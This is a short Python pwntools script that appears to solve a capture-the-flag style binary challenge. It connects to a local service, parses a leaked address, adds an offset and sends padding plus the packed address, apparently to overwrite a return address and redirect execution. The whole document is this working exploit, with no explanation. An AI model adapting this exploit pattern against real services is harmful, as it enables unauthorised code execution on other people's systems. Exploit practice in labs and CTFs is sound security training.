from pwn import *

context.arch = "amd64"

p = remote("localhost", 6969)
leak = p.recvline().decode().split("0x")[1].strip()
target = int(leak, 16) + 40
p.sendline(b"A" * 8 + p64(target))
print(p.clean())
